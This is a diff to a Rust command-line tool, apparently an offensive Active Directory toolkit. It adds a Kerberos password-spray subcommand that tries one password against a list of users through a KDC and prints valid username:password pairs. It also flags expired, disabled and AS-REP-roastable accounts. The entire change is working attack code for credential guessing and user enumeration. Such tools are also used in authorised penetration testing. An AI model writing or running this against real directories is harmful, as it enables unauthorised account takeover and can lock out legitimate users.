@@ -24,6 +24,24 @@ enum Command {
     Samr(SamrArgs),
     /// Resolve a name to its SID over LSAT (\lsarpc).
     Lsa(LsaArgs),
+    /// Kerberos password spray / user enumeration (no LDAP needed).
+    Spray(SprayArgs),
+}
+
+#[derive(Parser)]
+struct SprayArgs {
+    /// KDC host[:port]
+    #[arg(long)]
+    kdc: String,
+    /// Kerberos realm, e.g. TESTLAB.LOCAL
+    #[arg(long)]
+    realm: String,
+    /// Users: comma-separated list, or @file with one per line
+    #[arg(long)]
+    users: String,
+    /// Single password to spray across all users
+    #[arg(long)]
+    password: String,
 }
 
 #[derive(Parser)]
@@ -98,7 +116,32 @@ async fn main() -> Result<()> {
         Command::Roast(a) => roast(a).await,
         Command::Samr(a) => samr(a).await,
         Command::Lsa(a) => lsa(a).await,
+        Command::Spray(a) => spray(a).await,
     }
+}
+
+/// Kerberos password spray: one password across a user list, classified by KDC response.
+async fn spray(a: SprayArgs) -> Result<()> {
+    use adhammer_kerberos::{check_credential, CredResult};
+
+    let users: Vec<String> = if let Some(path) = a.users.strip_prefix('@') {
+        std::fs::read_to_string(path)?.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty()).collect()
+    } else {
+        a.users.split(',').map(|u| u.trim().to_string()).filter(|u| !u.is_empty()).collect()
+    };
+
+    for u in &users {
+        match check_credential(u, &a.password, &a.realm, &a.kdc).await {
+            Ok(CredResult::Valid) => println!("[+] VALID           {u}:{}", a.password),
+            Ok(CredResult::ValidButExpired) => println!("[+] VALID (expired) {u}:{}", a.password),
+            Ok(CredResult::Disabled) => println!("[-] disabled/locked {u}"),
+            Ok(CredResult::NoPreAuth) => println!("[*] AS-REP roastable {u} (no pre-auth)"),
+            Ok(CredResult::Invalid) | Ok(CredResult::NoSuchUser) => {} // quiet
+            Ok(CredResult::Other(c)) => eprintln!("    {u}: KDC error {c}"),
+            Err(e) => eprintln!("    {u}: {e}"),
+        }
+    }
+    Ok(())
 }
 
 /// LSAT name→SID over \lsarpc (SMB2 → NTLM → DCE/RPC → LsarOpenPolicy2 → LsarLookupNames).
